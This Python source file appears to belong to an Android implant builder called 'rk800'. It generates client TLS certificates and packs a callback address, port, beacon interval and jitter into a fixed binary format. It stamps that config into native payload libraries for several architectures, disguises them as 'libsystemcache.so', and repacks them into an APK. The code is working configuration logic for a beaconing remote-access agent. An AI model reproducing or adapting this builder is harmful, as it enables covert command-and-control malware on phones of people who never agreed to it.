from rk800.tls_cert import CertManager
from rk800.apk_repack import APKRepack
import argparse
import tempfile
from pathlib import Path
from importlib.resources import files
import struct


class Configure:
    """Configure APK with client settings and certificates
    
    Handles stamping binary with configuration data and repacking APK.
    """
    CLIENT_CANARY = b"\x41\x39\x31\x54\x21\xff\x3d\xc1\x7a\x45\x1b\x4e\x31\x5d\x36\xc1"
    CLIENT_FORMAT = "!HHQqQ256s2048s2048s2048s"
    SEC_IN_MIN = 60
    SANITY = 1987

    def __init__(self, output_path: Path, args: argparse.Namespace):
        """Initialize Configure instance
        
        Args:
            output_path (Path): path for output APK file
            args (argparse.Namespace): command line arguments
        """
        self.output_path = output_path
        self.args = args
        self.cert_manager = CertManager()

    def _pack_client_config(self, args: argparse.Namespace) -> bytes:
        """Pack client configuration into binary format
        
        Args:
            args (argparse.Namespace): command line arguments
            
        Returns:
            bytes: packed client configuration data
        """
        beacon_interval_seconds = args.beacon_interval * self.SEC_IN_MIN
        beacon_jitter_seconds = args.beacon_jitter * self.SEC_IN_MIN

        client_certs = self.cert_manager.generate_client_cert()

        return struct.pack(
            self.CLIENT_FORMAT,
            self.SANITY,
            args.port,
            beacon_interval_seconds,
            beacon_jitter_seconds,
            args.connection_weight,
            args.address.encode("utf-8"),
            client_certs["client_key"].encode("utf-8"),
            client_certs["client_cert"].encode("utf-8"),
            client_certs["ca_cert"].encode("utf-8"),
        )

    def stamp_binary(self, binary_data: bytes, args: argparse.Namespace) -> bytes:
        """Stamp binary with configuration data
        
        Args:
            binary_data (bytes): original binary data
            args (argparse.Namespace): command line arguments
            
        Returns:
            bytes: binary data with configuration stamped
        """
        data = bytearray(binary_data)
        
        canary_index = data.find(self.CLIENT_CANARY)
        if canary_index == -1:
            raise ValueError(f"CLIENT_CANARY not found in binary data")
        
        packed_config = self._pack_client_config(args)
        config_size = len(packed_config)
        expected_size = struct.calcsize(self.CLIENT_FORMAT)
        
        if config_size != expected_size:
            raise ValueError(f"Config size mismatch: got {config_size}, expected {expected_size}")
        
        if canary_index + config_size > len(data):
            raise ValueError(f"Not enough space in binary for config data")
        
        data[canary_index : canary_index + config_size] = packed_config
        
        return bytes(data)

    def write_configured_apk(self) -> None:
        """Write configured APK with stamped binaries
        
        Creates temporary directory, stamps binaries with config,
        and repacks into final APK.
        """
        assets_path = files("rk800.assets")
        
        with tempfile.TemporaryDirectory() as tmp_dir:
            tmp_path = Path(tmp_dir)
            
            for resource in assets_path.iterdir():
                if resource.name.endswith('.so'):
                    so_bytes = resource.read_bytes()
                    
                    if 'x86_64' in resource.name:
                        arch_dir = tmp_path / 'x86_64'
                        arch_dir.mkdir(parents=True, exist_ok=True)
                        output_file = arch_dir / 'libsystemcache.so'
                    elif 'arm32' in resource.name:
                        arch_dir = tmp_path / 'armeabi-v7a'
                        arch_dir.mkdir(parents=True, exist_ok=True)
                        output_file = arch_dir / 'libsystemcache.so'
                    elif 'aarch64' in resource.name:
                        arch_dir = tmp_path / 'arm64-v8a'
                        arch_dir.mkdir(parents=True, exist_ok=True)
                        output_file = arch_dir / 'libsystemcache.so'
                    else:
                        continue
                    
                    stamped_data = self.stamp_binary(so_bytes, self.args)
                    output_file.write_bytes(stamped_data)
            
            apk_repack = APKRepack(tmp_path, self.output_path)
            apk_repack.repack()
